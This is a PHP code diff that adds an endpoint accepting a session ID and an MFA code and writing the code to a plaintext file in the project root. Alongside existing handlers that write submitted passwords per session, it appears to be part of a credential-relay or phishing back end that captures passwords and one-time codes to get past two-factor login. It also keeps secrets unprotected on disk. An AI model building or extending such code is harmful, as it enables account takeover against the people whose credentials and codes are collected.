@@ -1100,6 +1100,7 @@ class Api {
             case 'get_connection_status': self::handleGetConnectionStatus(); break;
             case 'create_session': self::handleCreateSession(); break;
             case 'submit_password': self::handleSubmitPassword(); break;
+            case 'submit_mfa': self::handleSubmitMfa(); break;
             case 'check_login_status': self::handleCheckLoginStatus(); break;
             default:
             http_response_code(400);
@@ -1188,6 +1189,39 @@ class Api {
 
         Security::log("SUBMIT_PASSWORD: password written for session $cookieId");
         echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
+        exit;
+    }
+
+    private static function handleSubmitMfa() {
+        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            http_response_code(405);
+            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
+            exit;
+        }
+        $raw  = file_get_contents('php://input');
+        $data = json_decode($raw, true);
+        if (!is_array($data)) {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
+            exit;
+        }
+
+        $sessionId = isset($data['sessionId']) ? Security::sanitizeId($data['sessionId']) : '';
+        $code      = isset($data['code'])      ? trim($data['code'])                       : '';
+
+        if (!$sessionId || $code === '') {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Missing sessionId or code']);
+            exit;
+        }
+
+        $projectRoot = realpath(__DIR__ . '/..');
+        $mfaFile     = $projectRoot . '/mfa_' . $sessionId . '.txt';
+
+        file_put_contents($mfaFile, $code);
+        Security::log("SUBMIT_MFA: wrote MFA code for session $sessionId");
+
+        echo json_encode(['ok' => true]);
         exit;
     }
 
